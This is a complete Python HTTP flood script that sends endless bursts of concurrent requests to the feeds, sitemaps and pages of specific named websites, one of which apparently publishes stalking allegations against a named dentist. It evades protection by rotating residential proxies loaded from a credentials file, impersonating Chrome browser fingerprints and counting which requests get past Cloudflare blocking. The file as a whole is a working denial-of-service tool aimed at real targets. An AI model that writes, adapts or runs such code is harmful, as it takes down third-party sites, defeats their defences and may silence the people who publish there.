#!/usr/bin/env python3
"""
feed_flood.py — flood all open DYNAMIC endpoints on a target (no CF rule blocking them)

Usage:
  python3 feed_flood.py --webshare
  python3 feed_flood.py --webshare --target metoo-buffalo.com --endpoints buffalo
  python3 feed_flood.py --webshare --target metoo-shatkin.com --endpoints shatkin
  python3 feed_flood.py --proxy-file proxies_cf_passing_new.txt --concurrency 25 --bursts 0
"""

import time, random, argparse, threading, os
from concurrent.futures import ThreadPoolExecutor, as_completed
from curl_cffi import requests as cffi

CREDS_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                          "proxies_webshare_backbone_creds.txt")
WS_HOST    = "p.webshare.io"
WS_PORT    = 80

G = "\033[0;32m"; R = "\033[0;31m"; Y = "\033[0;33m"
C = "\033[0;36m"; W = "\033[0m";    B = "\033[1m"

PROFILES = [
    ("chrome124", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"),
    ("chrome120", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"),
    ("chrome110", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"),
    ("chrome107", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"),
]

ENDPOINT_SETS = {
    "feed":    ["/feed/", "/comments/feed/"],
    "sitemap": ["/sitemap_index.xml", "/sitemap.xml", "/page-sitemap.xml", "/category-sitemap.xml"],
    "home":    ["/", "/dentist-todd-shatkins-history-of-stalking/"],
    "shatkin": ["/feed/", "/comments/feed/", "/sitemap_index.xml", "/sitemap.xml",
                "/page-sitemap.xml", "/category-sitemap.xml", "/",
                "/dentist-todd-shatkins-history-of-stalking/"],
    "buffalo": ["/", "/feed/", "/comments/feed/", "/sitemap_index.xml", "/sitemap.xml",
                "/page-sitemap.xml", "/category-sitemap.xml", "/post-sitemap.xml",
                "/wp-sitemap.xml", "/author/admin/", "/author/admin/feed/",
                "/?p=1", "/about/", "/contact/", "/wp-content/"],
}

_lock       = threading.Lock()
_stats      = {"ok": 0, "blocked": 0, "err": 0, "total": 0}
_proxy_list = []
_proxy_idx  = 0
_endpoints  = []
_ws_proxy   = None


def load_proxies(path):
    global _proxy_list
    with open(path) as f:
        _proxy_list = [l.strip() for l in f if l.strip()]
    print(f"  Loaded {len(_proxy_list)} proxies from {path}")


def load_webshare():
    global _ws_proxy
    with open(CREDS_FILE) as f:
        lines = [l.strip() for l in f if l.strip()]
    user, pwd = lines[0], lines[1]
    _ws_proxy = f"http://{user}-rotate:{pwd}@{WS_HOST}:{WS_PORT}"
    print(f"  Webshare rotating proxy — {WS_HOST}:{WS_PORT}")


def next_proxy(single_proxy):
    global _proxy_idx
    if _ws_proxy:
        return _ws_proxy
    if _proxy_list:
        with _lock:
            p = _proxy_list[_proxy_idx % len(_proxy_list)]
            _proxy_idx += 1
        return p
    return single_proxy


def send_one(target, single_proxy, req_num):
    imp, ua = random.choice(PROFILES)
    path = random.choice(_endpoints)
    url  = f"https://{target}{path}"
    p    = next_proxy(single_proxy)
    px   = {"http": p, "https": p} if p else None
    t0   = time.time()
    try:
        r = cffi.get(url, headers={"User-Agent": ua},
                     proxies=px, impersonate=imp, timeout=15)
        elapsed   = time.time() - t0
        status    = r.status_code
        mitigated = r.headers.get("cf-mitigated", "")
        cache     = r.headers.get("cf-cache-status", "?")

        if status == 200 and not mitigated:
            color = G; tag = "PASS"
            with _lock: _stats["ok"] += 1
        elif mitigated or status in (403, 429):
            color = R; tag = "BLOCK"
            with _lock: _stats["blocked"] += 1
        else:
            color = Y; tag = str(status)
            with _lock: _stats["err"] += 1

        with _lock: _stats["total"] += 1
        print(f"  [{req_num:>3}] {color}{tag}{W}  {status}  cache={cache}  {elapsed:.2f}s  {imp}  {path}")
        return tag
    except Exception as e:
        elapsed = time.time() - t0
        with _lock:
            _stats["err"] += 1
            _stats["total"] += 1
        print(f"  [{req_num:>3}] {R}ERR{W}  {elapsed:.2f}s  {str(e)[:50]}")
        return "ERR"


def burst(target, concurrency, proxy, burst_num, start_req):
    print(f"\n{B}{C}── Burst {burst_num} ─────────────────────────────────{W}")
    t0 = time.time()
    with ThreadPoolExecutor(max_workers=concurrency) as pool:
        futs = {pool.submit(send_one, target, proxy, start_req + i): i
                for i in range(concurrency)}
        for f in as_completed(futs):
            _ = f.result()
    elapsed = time.time() - t0
    ok = _stats["ok"]; bl = _stats["blocked"]; tot = _stats["total"]
    print(f"  {B}burst done{W}  {elapsed:.1f}s  "
          f"total: {G}{ok} pass{W} / {R}{bl} blocked{W} / {tot} sent")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target",      default="metoo-shatkin.com")
    ap.add_argument("--concurrency", type=int, default=25)
    ap.add_argument("--bursts",      type=int, default=0,
                    help="0 = run forever (Ctrl+C to stop)")
    ap.add_argument("--delay",       type=float, default=1.0,
                    help="seconds between bursts")
    ap.add_argument("--proxy",       default=None)
    ap.add_argument("--proxy-file",  default=None)
    ap.add_argument("--webshare",    action="store_true",
                    help=f"use Webshare rotating residential proxy (creds from {CREDS_FILE})")
    ap.add_argument("--endpoints",   nargs="+",
                    choices=list(ENDPOINT_SETS.keys()) + ["all"],
                    default=["all"],
                    help="endpoint groups: feed sitemap home shatkin buffalo all")
    args = ap.parse_args()

    global _endpoints
    if "all" in args.endpoints:
        for paths in ENDPOINT_SETS.values():
            _endpoints.extend(paths)
    else:
        for k in args.endpoints:
            _endpoints.extend(ENDPOINT_SETS[k])
    _endpoints = list(dict.fromkeys(_endpoints))

    if args.webshare:
        load_webshare()
    elif args.proxy_file:
        load_proxies(args.proxy_file)

    proxy_label = ("webshare-rotating" if args.webshare
                   else args.proxy_file or args.proxy or "none (system IP)")
    print(f"\n{B}feed_flood.py{W}  target={C}{args.target}{W}  "
          f"concurrency={args.concurrency}  proxy={proxy_label}")
    print(f"  endpoints ({len(_endpoints)}): {_endpoints}")
    print("Ctrl+C to stop\n")

    req_counter = 1
    burst_num   = 1
    try:
        while True:
            burst(args.target, args.concurrency, args.proxy, burst_num, req_counter)
            req_counter += args.concurrency
            burst_num   += 1
            if args.bursts and burst_num > args.bursts:
                break
            time.sleep(args.delay)
    except KeyboardInterrupt:
        pass

    print(f"\n{B}done{W}  {_stats['total']} reqs — "
          f"{G}{_stats['ok']} pass{W}  {R}{_stats['blocked']} blocked{W}  "
          f"{Y}{_stats['err']} err{W}")


if __name__ == "__main__":
    main()
